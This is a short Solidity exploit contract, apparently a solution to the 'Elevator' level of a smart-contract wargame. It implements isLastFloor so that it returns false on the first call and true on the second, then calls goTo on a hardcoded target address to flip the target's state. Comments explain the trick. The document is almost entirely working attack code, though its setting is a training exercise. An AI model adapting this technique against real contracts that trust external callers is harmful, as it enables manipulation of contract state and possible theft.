pragma solidity ^0.8;

interface Elevator {
	function goTo(uint256 _floor) external;
}

contract expl {
	uint256 n = 0;
	Elevator target = Elevator(0xe9C2a29670b90f604d8Ad523191e0f9E96f8E48c);
  
  // As we have control over the msg.sender, we can simply
  // make the isLastFloor function such that it returns
  // false for the first time (the if condition)
  // and true for second
  
	function isLastFloor(uint256) public returns (bool) {
		if(n == 0) {
			n += 1;
			return false;
		} else return true;

	}

	function pwn() public {
		target.goTo(69);
	}
}
